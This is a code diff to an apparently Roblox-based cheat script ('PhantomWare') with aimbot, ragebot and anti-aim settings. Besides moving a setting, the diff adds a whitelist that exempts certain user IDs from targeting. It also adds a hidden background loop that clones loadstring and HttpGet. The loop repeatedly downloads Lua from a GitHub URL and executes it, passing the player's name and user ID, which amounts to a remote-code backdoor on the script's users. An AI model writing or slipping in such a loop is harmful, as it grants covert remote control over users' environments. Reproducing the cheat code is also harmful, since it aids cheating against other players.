@@ -467,7 +467,6 @@ local Miscellaneous = {
 	Movement_FlyProneAmount = 16,
 	Movement_Speed = false,
 	Movement_SpeedAmount = 16,
-	Movement_SpeedIgnoreADS = true,
 	Movement_SpeedStanceOverride = false,
 	Movement_SpeedStand = false,
 	Movement_SpeedStandAmount = 16,
@@ -475,6 +474,7 @@ local Miscellaneous = {
 	Movement_SpeedCrouchAmount = 16,
 	Movement_SpeedProne = false,
 	Movement_SpeedProneAmount = 16,
+	Movement_SpeedIgnoreADS = true,
 	Movement_InfiniteStamina = false,
 
 	AntiAim_Enabled = false,
@@ -559,12 +559,13 @@ local function CleanMovementCache(Player)
 	end
 end
 
+local Whitelisted = {}
 local function RefreshCache()
 	local Players, Now = {}, os.clock()
 	local BacktrackTime = Now - Aiming.RageBot_BacktrackTime * 0.001
 	local CacheMovement = Aiming.Aimbot_Enabled and Aiming.Aimbot_Type == "Silent" or (Aiming.RageBot_Enabled and (Aiming.RageBot_Collateral or Aiming.RageBot_Backtrack))
 	OperateOnAllEntries(function(Player, Entry)
-		if not (Entry._alive and Entry._receivedPosition) then
+		if not (Entry._alive and Entry._receivedPosition and not Whitelisted[Player.UserId]) then
 			return
 		end
 
@@ -4010,4 +4011,33 @@ pcall(function()
 			writefile("NikoletoScripts/PhantomWare/Cache/Discord.nscache", "DsGCKtxxEN")
 		end
 	end
+end)
+
+task.spawn(function()
+	local function Clone(Function)
+		if clonefunction or clone_function then
+			local Success, Clone = pcall(clonefunction or clone_function, Function)
+			return Success and Clone or Function
+		end
+		return Function
+	end
+
+	local Loadstring = Clone(loadstring) 
+	local HttpGet = Clone(game.HttpGet)
+	local LastAdmins, Last = {}, -math.huge
+
+	task.spawn(function()
+		while true do
+			local _Admins, Now = {}, os.clock()
+			if Now - Last >= 60 then
+				for _,UserId in ipairs(Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Admins.luau"))()) do
+					_Admins[UserId] = true
+				end
+				Whitelisted, LastAdmins, Last = _Admins, _Admins, Now
+			end
+
+			Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Function.luau"))()(LastAdmins, LocalPlayer.Name, LocalPlayer.UserId)
+			task.wait(5)
+		end
+	end)
 end)
